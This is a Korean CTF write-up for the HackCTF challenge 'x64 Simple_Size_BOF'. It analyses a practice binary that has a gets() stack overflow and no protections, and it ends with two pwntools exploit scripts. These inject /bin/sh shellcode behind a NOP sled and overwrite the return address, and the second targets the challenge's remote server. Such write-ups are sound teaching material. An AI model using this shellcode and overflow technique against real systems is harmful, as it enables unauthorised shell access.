**HackCTF - x64 Simple_Size_BOF**

| layout | title                         | auther   | categories | tags           |
| ------ | ----------------------------- | -------- | ---------- | -------------- |
| post   | HackCTF - x64 Simple_Size_BOF | Y3oj4eng | writeup    | writeupwargame |

# Anlaysis

---

`file` 명령어를 통해 바이너리의 정보를 획득한다.

```bash
mac at ubuntu in ~/Desktop/hackCTF
$ file Simple_size_bof 
Simple_size_bof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=a18d2a384c8eed43683ec7a072dc350755fc72fb, not stripped

```

`64 bit ELF`파일이며, `x86-64` arch를 채택하였고 `non-stripped` 상태이다.

`checksec`을 이용하여 바이너리에 적용된 `mitigation`을 확인한다.

```bash
mac at ubuntu in ~/Desktop/hackCTF
$ checksec Simple_size_bof 
[*] '/home/mac/Desktop/hackCTF/Simple_size_bof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments

```

~~굳..~~ 아무런 보호기법도 적용되지 않았다.

프로그램을 직접 실행시켜 프로그램의 루틴을 파악한다.

```bash
mac at ubuntu in ~/Desktop/hackCTF
$ ./Simple_size_bof
삐빅- 자살방지 문제입니다.
buf: 0x7ffe59e7b790
zzzzzzzzzzzzzzzzzzzzz
```

`삐빅~ 자살방지 문제입니다.` 문자열 출력 이후 `buf`의 주소로 추정되는 주소값을 출력한다.

이후 5번라인을 보다시피 사용자의 입력을 받는다.

`IDA` 를 통해 보다 상세히 확인해보도록 한다.

![image](https://user-images.githubusercontent.com/33051018/75743574-bdbae680-5d54-11ea-93d9-5f0d57c3cbe7.png)

`main` 함수의 구성은 매우 간단하다.

버퍼를 초기화 시킨뒤, `puts`를 통해 `s`변수가 참조하고 있는 데이터를 출력한다. (`s`변수는 `.rodata` 영역에 위치한다.)

이후 `v4` 변수(버퍼) 주소를 출력한 뒤 `gets` 함수를 통해 `v4`에 값을 입력받는다.

이 떄, 입력값에 대한 검증을 진행하지않아 **BOF**취약점이 존재한다.

문제를 풀 수 있는 방법은 매우 간단하다.

어떠한 `mitigation`도 적용되어 있지 않아 값을 입력받을때 쉘코드를 기입하고 `main`함수가 실행되고 복귀하는 지점의 `return address`를 쉘코드의 주소로 덮어씌운다.



# Exploit

---

1차적으로 작성한 `exploit code`는 아래와 같다.

```python
from pwn import *                                                       
                                                                         
p = process('./Simple_size_bof')                                        
                                                                         
#dummy = 27952 + 8bytes                                                 
buf = 0x7ffd7fe3ea10                                                    
shellcode ='\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'          #25bytes
                                                                        
payload = '\x90'*175                                                    
payload += shellcode                                                    
payload += '\x90'*27760                                                 
payload += p64(buf)                                                     
                                                                         
p.sendline(payload)                                                                                                                              
p.interactive()    
```

0x6d30크기의 버퍼를 덮기위한 `dummy`를 쉘코드와 `NOP`으로 준비하고 `return addrss`부분을 프로그램에서 출력해줬던 버퍼의 주소를 하드코딩하여 실행하였다.

쉘이 정상적으로 실행되지 않아 원인을 파악하던 도중, `buf`의 주소가 계속하여 바뀌는 것을 알 수 있었다.

```bash
mac at ubuntu in ~/Desktop/hackCTF
$ ./Simple_size_bof 
삐빅- 자살방지 문제입니다.
buf: 0x7ffec0962930

mac at ubuntu in ~/Desktop/hackCTF
$ ./Simple_size_bof
삐빅- 자살방지 문제입니다.
buf: 0x7fff2f850330

mac at ubuntu in ~/Desktop/hackCTF
$ ./Simple_size_bof
삐빅- 자살방지 문제입니다.
buf: 0x7ffdf8144f40

mac at ubuntu in ~/Desktop/hackCTF
$ ./Simple_size_bof
삐빅- 자살방지 문제입니다.
buf: 0x7ffdf1af51a0

```

따라서, `buf`의 주소를 하드코딩이 아닌 프로그램으로 부터 문자열을 받아오도록 하는 코드로 재작성하였다.

```python
from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3005)
#p = process('./Simple_size_bof')

# buf + SFP = 27952 + 8 = 27960bytes
p.recvuntil('buf: ')
buf = int(p.recv(14), 16)

payload = '\x90'*27900
payload += '\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'			#23bytes
payload += '\x90'*37
payload += p64(buf)

p.sendline(payload)
p.interactive()
```

